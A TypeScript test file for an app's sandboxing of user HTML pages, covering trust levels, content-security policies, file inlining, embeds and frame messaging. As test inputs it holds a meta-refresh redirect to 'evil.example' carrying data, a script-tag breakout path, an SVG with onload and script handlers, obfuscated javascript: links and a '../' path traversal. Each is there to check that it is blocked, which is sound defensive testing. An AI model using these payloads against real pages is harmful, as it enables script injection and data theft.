// HTML pages (docs/html-pages.md): what makes a file a page, the policy that fits its trust, its files inlined from the vault, its
// embeds, the frame's page, where a page came from, and what its `golem` calls may do.

import assert from 'node:assert/strict';
import { test } from 'node:test';
import vm from 'node:vm';

import { composePage, embedAddresses, fillEmbeds, frameMessage, inlineFiles, isPageHtml, isRelative, newToken, pageAsks, pageCsp, policyFor, resolvePath, runtimeSource } from '../src/pages/compose.ts';
import { safeLinks, scopeCss, tableHtml, resultHtml } from '../src/pages/embedHtml.ts';
import { editOps, PageRequests } from '../src/pages/requests.ts';
import { fingerprint, PageMemory, readsAny, SessionGrants, shouldReportOutside, trimRecords, trustOf } from '../src/pages/trust.ts';
import { answerKey } from '../src/pages/answers.ts';
import { openingView } from '../src/pages/detect.ts';
import type { ScriptVault } from '../src/scripts/vault.ts';

const enc = (s: string) => new TextEncoder().encode(s);

test('a page is HTML with a script, an embed or a golem meta; anything else is a document', () => {
  assert.equal(isPageHtml('<h1>Notes</h1><p>Plain</p>'), false);
  assert.equal(isPageHtml('<p>x</p><script>1</script>'), true);
  assert.equal(isPageHtml('<golem-embed src="Budget.xlsx#Total"></golem-embed>'), true);
  assert.equal(isPageHtml('<meta name="golem-reads" content="Books/">'), true);
});

test('a page opens as a page unless Source was last chosen; other HTML as it was last shown', () => {
  const page = '<p>x</p><script>1</script>';
  assert.equal(openingView(page, null), 'page');
  assert.equal(openingView(page, 'document'), 'page', 'Document never sticks to a page');
  assert.equal(openingView(page, 'source'), 'source');
  assert.equal(openingView('<p>plain</p>', null), 'document');
  assert.equal(openingView('<p>plain</p>', 'page'), 'page');
});

test('a page asks for folders and hosts in its metas', () => {
  const asks = pageAsks('<meta name="golem-reads" content="/Books/, Work/Reports , Books"><meta name=golem-network content="https://api.example.com/v1, not a host, cdn.example.org">');
  assert.deepEqual(asks.reads, ['Books', 'Work/Reports']);
  assert.deepEqual(asks.network, ['api.example.com', 'cdn.example.org']);
});

test('an own page runs scripts and has the network; a foreign one that may read has neither', () => {
  const asks = { reads: ['Books'], network: ['api.example.com'] };
  const own = policyFor('own', false, asks);
  assert.deepEqual(own, { scripts: true, network: true, connect: ['api.example.com'], forms: true });
  const ownCsp = pageCsp(own);
  assert.match(ownCsp, /form-action https:/);
  assert.match(ownCsp, /script-src 'unsafe-inline' 'unsafe-eval' data: blob: https:/);
  assert.match(ownCsp, /connect-src https:\/\/api\.example\.com/);
  // A foreign page that may not read keeps its scripts and network: it has nothing of the person's to send. It posts no forms: it
  // could pose as the app's sign-in.
  const unread = policyFor('foreign', false, asks);
  assert.deepEqual(unread, { ...own, forms: false });
  assert.match(pageCsp(unread), /form-action 'none'/);
  const reading = policyFor('foreign', true, asks);
  assert.deepEqual(reading, { scripts: false, network: false, connect: [], forms: false });
  const csp = pageCsp(reading);
  assert.match(csp, /script-src 'none'/);
  assert.match(csp, /connect-src 'none'/);
  assert.match(csp, /img-src data: blob:;/);
  assert.match(csp, /form-action 'none'/);
  assert.doesNotMatch(csp, /https:/);
});

test('relative addresses resolve inside the vault, and a floor keeps a foreign page in its folder', () => {
  assert.equal(isRelative('chart.png'), true);
  assert.equal(isRelative('https://x.com/a.png'), false);
  assert.equal(isRelative('//cdn/x.js'), false);
  assert.equal(isRelative('#top'), false);
  assert.equal(isRelative('data:image/png;base64,'), false);
  assert.equal(resolvePath('Reports/Q3', 'img/a%20b.png?v=2#x'), 'Reports/Q3/img/a b.png');
  assert.equal(resolvePath('Reports/Q3', '../shared.css'), 'Reports/shared.css');
  assert.equal(resolvePath('Reports', '../../x.css'), null);
  assert.equal(resolvePath('Reports/Q3', '../shared.css', 'Reports/Q3'), null);
  assert.equal(resolvePath('Reports/Q3', 'style.css', 'Reports/Q3'), 'Reports/Q3/style.css');
  assert.equal(resolvePath('Reports', '/Diary/today.md'), 'Diary/today.md');
});

test('files beside a page are inlined: pictures, scripts, stylesheets and what they name', async () => {
  const files: Record<string, string> = {
    'Site/pic.png': 'PNG',
    'Site/app.js': 'console.log(1)',
    'Site/style.css': 'body{background:url("bg.png")} @import "more.css";',
    'Site/bg.png': 'BG',
    'Site/more.css': 'p{}',
    'Private/secret.txt': 'secret',
  };
  const read = async (path: string) => (files[path] ? { bytes: enc(files[path]), type: path.endsWith('.css') ? 'text/css' : 'application/octet-stream' } : null);
  const html = '<img src="pic.png"><script src="app.js"></script><link rel="stylesheet" href="style.css"><a href="other.html">x</a><img src="https://example.com/x.png"><script>const s = "<img src=\'pic.png\'>";</script><div style="background:url(bg.png)"></div><img src="../Private/secret.txt">';
  const own = await inlineFiles(html, 'Site', read, null);
  assert.match(own.html, /<img src="data:application\/octet-stream;base64,UE5H">/);
  assert.match(own.html, /<script src="data:application\/octet-stream;base64,[^"]+"><\/script>/);
  assert.match(own.html, /<link rel="stylesheet" href="data:text\/css;base64,/);
  assert.match(own.html, /<a href="other.html">/, 'links are opened by the app, not inlined');
  assert.match(own.html, /https:\/\/example\.com\/x\.png/);
  assert.match(own.html, /const s = "<img src='pic.png'>";/, 'script text is left as written');
  assert.match(own.html, /style="background:url\(&quot;data:/);
  const css = own.html.match(/href="data:text\/css;base64,([^"]+)"/)![1];
  assert.match(atob(css), /url\("data:/, "a stylesheet's own files are inlined too");
  assert.ok(own.files.includes('Private/secret.txt'), 'an own page reaches the whole vault');
  const foreign = await inlineFiles(html, 'Site', read, 'Site');
  assert.match(foreign.html, /<img src="\.\.\/Private\/secret\.txt">/, "a foreign page can't climb out of its folder");
  assert.ok(!foreign.files.includes('Private/secret.txt'));
});

test('embeds are found and filled by address', () => {
  const html = '<golem-embed src="Budget.xlsx#Total">old</golem-embed><p>x</p><golem-embed inline src=\'Notes.md#Plan\'></golem-embed><golem-embed src="Budget.xlsx#Total"></golem-embed>';
  assert.deepEqual(embedAddresses(html), ['Budget.xlsx#Total', 'Notes.md#Plan']);
  const filled = fillEmbeds(html, new Map([['Budget.xlsx#Total', '<b>42</b>']]));
  assert.equal(filled, '<golem-embed src="Budget.xlsx#Total"><b>42</b></golem-embed><p>x</p><golem-embed inline src=\'Notes.md#Plan\'></golem-embed><golem-embed src="Budget.xlsx#Total"><b>42</b></golem-embed>');
});

test("the frame's page starts with the policy and the runtime, keeps the doctype first and drops a refresh", () => {
  const page = composePage('<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=https://evil.example/?d=1"><title>T</title></head><body>hi</body></html>', "default-src 'none'", { path: 'a.html', trust: 'own', scroll: 0, token: 't' });
  assert.match(page, /^<!DOCTYPE html><meta http-equiv="Content-Security-Policy" content="default-src &#39;none&#39;|^<!DOCTYPE html><meta http-equiv="Content-Security-Policy" content="default-src 'none'"/);
  assert.ok(page.indexOf('window.golem') < page.indexOf('<title>'), 'the runtime runs before the page');
  assert.doesNotMatch(page, /refresh/);
  const still = composePage('<p>hi</p>', "default-src 'none'", null);
  assert.doesNotMatch(still, /<script/, 'a page whose scripts may not run gets no runtime');
  assert.match(still, /^<meta http-equiv="Content-Security-Policy"/);
});

test("a page's runtime can't break out of its script with a path", () => {
  const page = composePage('<p>x</p>', "default-src 'none'", { path: '</script><script>alert(1)</script>.html', trust: 'own', scroll: 0, token: 't' });
  assert.equal(page.match(/<\/script>/g)!.length, 1);
});

test('own unless it came from elsewhere; a mark makes it own until its bytes change', async () => {
  const hash = await fingerprint(enc('<p>a</p>'));
  assert.equal(trustOf({ hash }), 'own');
  assert.equal(trustOf({ hash, role: 'owner' }), 'own');
  assert.equal(trustOf({ hash, role: 'editor' }), 'foreign');
  assert.equal(trustOf({ hash, role: 'owner', byOther: true }), 'foreign');
  assert.equal(trustOf({ hash, imported: true }), 'foreign');
  assert.equal(trustOf({ hash, downloaded: true }), 'foreign');
  assert.equal(trustOf({ hash, downloaded: true, markedHash: hash }), 'own');
  assert.equal(trustOf({ hash, downloaded: true, markedHash: await fingerprint(enc('<p>b</p>')) }), 'foreign');
  assert.notEqual(await fingerprint(enc('ab')), await fingerprint(enc('ba')));
});

test("a page's fingerprint is SHA-256, and a mark kept with an earlier fingerprint no longer matches", async () => {
  assert.equal(await fingerprint(enc('abc')), 'sha256:ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad');
  // What the earlier app kept (FNV, 16 hex digits): safe to read, but the page is foreign again until marked again.
  assert.equal(trustOf({ hash: await fingerprint(enc('abc')), imported: true, markedHash: '1a47e90b3d4a7c21' }), 'foreign');
});

test("what is allowed for a session holds for the bytes it was allowed for, not for another file of the same name", async () => {
  const once = new SessionGrants();
  const mine = await fingerprint(enc('<p>mine</p>'));
  const other = await fingerprint(enc('<script>steal()</script>'));
  once.markMine('report.html', mine);
  assert.equal(trustOf({ hash: mine, imported: true, markedHash: once.marked('report.html') }), 'own');
  assert.equal(trustOf({ hash: other, imported: true, markedHash: once.marked('report.html') }), 'foreign', 'another report.html is not trusted by the mark');
  once.allowReads('report.html', mine, ['Books']);
  assert.deepEqual(once.reads('report.html', mine), ['Books']);
  assert.equal(once.reads('report.html', other), null);
  assert.equal(once.marked('other.html'), null);
});

test('this device remembers pages: imported, marked, allowed reads for these bytes, and how each was shown', () => {
  const store = new Map<string, string>();
  const memory = new PageMemory({ getItem: (k) => store.get(k) ?? null, setItem: (k, v) => void store.set(k, v) });
  memory.setImported('new');
  memory.moved('new', 'kept');
  assert.equal(memory.imported('kept'), true);
  memory.markMine('kept', 'h1');
  assert.equal(memory.marked('kept'), 'h1');
  memory.allowReads('kept', 'h1', ['Books']);
  assert.deepEqual(memory.reads('kept', 'h1'), ['Books']);
  assert.equal(memory.reads('kept', 'h2'), null, 'a changed page asks again');
  memory.setView('kept', 'source');
  assert.equal(memory.view('kept'), 'source');
  assert.equal(memory.view('other'), null);
});

test('a download mark makes a page foreign until the person accepts it, and an old shell that can\'t tell counts as one', () => {
  const hash = 'sha256:aa';
  assert.equal(trustOf({ hash, role: 'owner', downloaded: true }), 'foreign');
  assert.equal(trustOf({ hash, role: 'owner', downloaded: null }), 'foreign', 'unknown counts as downloaded');
  assert.equal(trustOf({ hash, role: 'owner', downloaded: false }), 'own');
  assert.equal(trustOf({ hash, role: 'owner' }), 'own', 'no vault folder: nothing to ask');
  // Accepted (Mark as Mine while it had the mark): edited afterwards, it stays the person's.
  assert.equal(trustOf({ hash: 'sha256:bb', role: 'owner', downloaded: true, acceptedDownload: true }), 'own');
  assert.equal(trustOf({ hash, role: 'owner', downloaded: null, acceptedDownload: true }), 'own');
  // Accepting a download mark doesn't excuse anything else.
  assert.equal(trustOf({ hash, role: 'owner', downloaded: true, acceptedDownload: true, byOther: true }), 'foreign');
  assert.equal(trustOf({ hash, role: 'editor', acceptedDownload: true }), 'foreign');
  assert.equal(trustOf({ hash, imported: true, acceptedDownload: true }), 'foreign');
});

test('Mark as Mine on this device clears "came from outside", accepts a download mark, and keeps the mark for these bytes', () => {
  const store = new Map<string, string>();
  const memory = new PageMemory({ getItem: (k) => store.get(k) ?? null, setItem: (k, v) => void store.set(k, v) });
  memory.setImported('page');
  memory.markOwn('page', 'h1', true);
  assert.equal(memory.imported('page'), false);
  assert.equal(memory.acceptedDownload('page'), true);
  assert.equal(memory.marked('page'), 'h1');
  // Marked again later without the download mark: what was accepted stays accepted.
  memory.markOwn('page', 'h2', false);
  assert.equal(memory.acceptedDownload('page'), true);
  memory.markOwn('plain', 'h3', false);
  assert.equal(memory.acceptedDownload('plain'), false);
  memory.setReported('page', 'h2');
  assert.equal(memory.reported('page'), 'h2');
});

test('a page from outside is told to the account once for its bytes, and only for a page the person owns', () => {
  const hash = 'sha256:aa';
  assert.equal(shouldReportOutside({ hash, role: 'owner', imported: true }, null), true);
  assert.equal(shouldReportOutside({ hash, role: 'owner', downloaded: true }, null), true);
  assert.equal(shouldReportOutside({ hash, imported: true }, null), true, 'not in the account yet: the host says it can\'t be told');
  assert.equal(shouldReportOutside({ hash, role: 'owner', imported: true }, hash), false, 'already told for these bytes');
  assert.equal(shouldReportOutside({ hash, role: 'owner', imported: true }, 'sha256:old'), true, 'new bytes are told again');
  assert.equal(shouldReportOutside({ hash, role: 'owner', downloaded: null }, null), false, 'an old shell can\'t tell: nothing is said');
  assert.equal(shouldReportOutside({ hash, role: 'owner', downloaded: true, acceptedDownload: true }, null), false);
  assert.equal(shouldReportOutside({ hash, role: 'owner', downloaded: true, byOther: true }, null), false, 'the account already says so');
  assert.equal(shouldReportOutside({ hash, role: 'editor', imported: true }, null), false, 'only the owner may say');
  assert.equal(shouldReportOutside({ hash, role: 'owner', downloaded: false }, null), false);
});

test('trimming what this device remembers never drops a page that came from outside or had its download accepted', () => {
  const entries: [string, { imported?: boolean; acceptedDownload?: boolean; view?: string }][] = [
    ['a', { imported: true }],
    ['b', { view: 'page' }],
    ['c', { acceptedDownload: true }],
    ['d', { view: 'source' }],
    ['e', { view: 'page' }],
  ];
  assert.deepEqual(trimRecords(entries, 3).map(([k]) => k), ['a', 'c', 'e']);
  assert.deepEqual(trimRecords(entries, 5), entries);
  assert.deepEqual(trimRecords(entries, 1).map(([k]) => k), ['a', 'c'], 'kept even past the limit');
  // Through the memory: hundreds of pages looked at later don't make an imported one own again.
  const store = new Map<string, string>();
  const memory = new PageMemory({ getItem: (k) => store.get(k) ?? null, setItem: (k, v) => void store.set(k, v) });
  memory.setImported('evil');
  for (let i = 0; i < 520; i++) memory.setView(`p${i}`, 'page');
  assert.equal(memory.imported('evil'), true);
  assert.equal(memory.view('p0'), null, 'the oldest plain record went');
});

test("what a page read of an encrypted document is never kept for its viewers", () => {
  const encrypted = ['Private/Diary.md'];
  assert.equal(readsAny(['Plan.md'], encrypted), false);
  assert.equal(readsAny(['private/diary.md'], encrypted), true);
  assert.equal(readsAny(['Private/'], encrypted), true, 'a folder holding it');
  assert.equal(readsAny(['/'], encrypted), true, 'the whole vault');
  assert.equal(readsAny(['Pri/'], encrypted), false);
  assert.equal(readsAny(['/'], []), false);
});

test("an embed's document styles apply inside the embed only", () => {
  const scoped = scopeCss('body { font-family: Calibri; }\n/* note */ p, h1 { margin: 0; }\n th, td { border: 1px solid #000; }\n@media print { p { color: red; } }');
  assert.equal(scoped, 'golem-embed { font-family: Calibri; }\ngolem-embed p, golem-embed h1 { margin: 0; }\ngolem-embed th, golem-embed td { border: 1px solid #000; }');
});

test('embeds show tables, values and errors as HTML, escaped', () => {
  const html = tableHtml({ kind: 'table', rows: [['Name', 'Total'], ['<b>', '1\n2']], header: true, align: ['left', 'right'] });
  assert.equal(html, '<table><thead><tr><th>Name</th><th style="text-align:right">Total</th></tr></thead><tbody><tr><td>&lt;b&gt;</td><td style="text-align:right">1<br>2</td></tr></tbody></table>');
  assert.equal(resultHtml({ kind: 'value', text: '<i>' }, () => ''), '&lt;i&gt;');
  assert.match(resultHtml({ kind: 'error', code: 'missing' }, () => 'No <such> file'), /class="golem-embed-error"[^>]*>No &lt;such&gt; file</);
});

test('an embedded drawing is a picture, never markup: nothing in its SVG runs', () => {
  const svg = '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="steal()"><script>steal()</script><rect width="2" height="2"/></svg>';
  const html = resultHtml({ kind: 'picture', bytes: new Uint8Array(), svg, width: 20, height: 10 }, () => '');
  assert.match(html, /^<img src="data:image\/svg\+xml;base64,[A-Za-z0-9+/=]+" width="20" height="10" alt="">$/);
  assert.doesNotMatch(html, /<script|onload|<svg/);
  const b64 = /base64,([^"]+)"/.exec(html)![1];
  assert.equal(new TextDecoder().decode(Uint8Array.from(atob(b64), (c) => c.charCodeAt(0))), svg, 'the picture is the drawing as it is');
});

test("an embedded document's links can't run code", () => {
  const html = '<p><a href="javascript:steal()">a</a> <a href="  JaVa&#10;script:x">b</a> <a href="data:text/html,x">c</a> <a href="https://example.com/?a=1&amp;b=2">d</a> <a href="Notes.md">e</a></p>';
  assert.equal(safeLinks(html), '<p><a href="#">a</a> <a href="#">b</a> <a href="#">c</a> <a href="https://example.com/?a=1&amp;b=2">d</a> <a href="Notes.md">e</a></p>');
});

test("only messages with this load's secret are taken from a page's frame", () => {
  const token = newToken();
  assert.match(token, /^[0-9a-f]{32}$/);
  assert.notEqual(newToken(), token);
  assert.deepEqual(frameMessage({ golem: 1, type: 'request', token, id: 1, op: 'read' }, token), { golem: 1, type: 'request', token, id: 1, op: 'read' });
  assert.equal(frameMessage({ golem: 1, type: 'request', id: 1, op: 'read' }, token), null, 'no secret: a document the frame moved on to');
  assert.equal(frameMessage({ golem: 1, type: 'request', token: 'guess', op: 'read' }, token), null);
  assert.equal(frameMessage({ golem: 1, type: 'request', token }, null), null, 'nothing is answered while the page is leaving');
  assert.equal(frameMessage({ type: 'request', token }, token), null);
  assert.equal(frameMessage('x', token), null);
});

test("a page's runtime sends its load's secret with every message, and takes only messages that carry it", () => {
  const sent: Record<string, unknown>[] = [];
  const listeners = new Map<string, ((e: unknown) => void)[]>();
  const parent = { postMessage: (m: Record<string, unknown>) => sent.push(m) };
  const context: Record<string, unknown> = {
    parent,
    addEventListener: (type: string, fn: (e: unknown) => void) => listeners.set(type, [...(listeners.get(type) ?? []), fn]),
    document: { addEventListener: () => {}, querySelectorAll: () => [] },
    setTimeout,
    clearTimeout,
    scrollTo: () => {},
    scrollY: 0,
    console,
  };
  context.window = context;
  vm.runInNewContext(runtimeSource({ path: 'a.html', trust: 'own', scroll: 0, token: 'secret' }), context);
  const golem = context.golem as { read(path: string): Promise<unknown> };
  let answer: unknown = null;
  void golem.read('Notes.md').then((v) => (answer = v));
  assert.equal(sent.length, 1);
  assert.equal(sent[0].token, 'secret');
  assert.equal(sent[0].type, 'request');
  const deliver = (data: unknown) => listeners.get('message')!.forEach((fn) => fn({ source: parent, data }));
  deliver({ golem: 1, type: 'reply', id: sent[0].id, ok: true, value: 'forged' });
  deliver({ golem: 1, token: 'secret', type: 'reply', id: sent[0].id, ok: true, value: 'real' });
  return new Promise<void>((resolve) =>
    setImmediate(() => {
      assert.equal(answer, 'real');
      listeners.get('pagehide')!.forEach((fn) => fn({}));
      assert.deepEqual({ ...sent.at(-1) }, { type: 'leaving', golem: 1, token: 'secret' });
      resolve();
    }),
  );
});

function vault(files: Record<string, string>): ScriptVault {
  const stored = Object.fromEntries(Object.entries(files).map(([k, v]) => [k, enc(v)]));
  return {
    list: async (folder) => Object.keys(stored).filter((p) => folder === '' || p.startsWith(`${folder}/`)).map((path) => ({ path, bytes: stored[path] })),
    file: async (path) => (stored[path] ? { path, bytes: stored[path] } : null),
    produce: async () => ({ kind: 'value', text: '42' }),
  };
}

test("an own page reads and changes the vault; a foreign one's scripts do neither", async () => {
  const stores: string[] = [];
  const logged: number[] = [];
  const deps = {
    vault: vault({ 'Books/Dune.md': '---\nauthor: Herbert\n---\n# Dune\n' }),
    embed: async () => ({ result: { kind: 'value' as const, text: '7' }, paths: ['Books/Dune.md'] }),
    store: async (file: { path: string }) => void stores.push(file.path),
    logged: (files: readonly unknown[]) => void logged.push(files.length),
  };
  const own = new PageRequests(deps, { path: 'Site/index.html', name: 'index.html', trust: 'own' });
  const notes = (await own.handle('notes', ['Books'])) as { title: string; fields: Record<string, string> }[];
  assert.equal(notes[0].title, 'Dune');
  assert.equal(notes[0].fields.author, 'Herbert');
  assert.equal(await own.handle('embed', ['Budget.xlsx#Total']), '7');
  assert.ok(own.read.has('Books/') && own.read.has('Books/Dune.md'));
  assert.equal(await own.handle('edit', ['Books/Dune.md', [{ op: 'append', markdown: 'Read it.' }]]), 1);
  assert.deepEqual(stores, ['Books/Dune.md']);
  assert.deepEqual(logged, [1]);
  const foreign = new PageRequests(deps, { path: 'In/page.html', name: 'page.html', trust: 'foreign' });
  await assert.rejects(foreign.handle('notes', ['Books']));
  await assert.rejects(foreign.handle('embed', ['Budget.xlsx#Total']));
  await assert.rejects(foreign.handle('edit', ['Books/Dune.md', [{ op: 'append', markdown: 'x' }]]));
  await assert.rejects(own.handle('fetch', ['https://example.com']));
});

test("a page's edits are only the known operations", () => {
  assert.deepEqual(editOps([{ op: 'setField', key: 'status', value: 3 }]), [{ op: 'setField', key: 'status', value: '3' }]);
  assert.throws(() => editOps([{ op: 'delete' }]));
  assert.throws(() => editOps('append'));
});

test("a read's answer is kept under its operation and arguments", () => {
  assert.equal(answerKey('notes', ['Books']), 'notes:["Books"]');
});
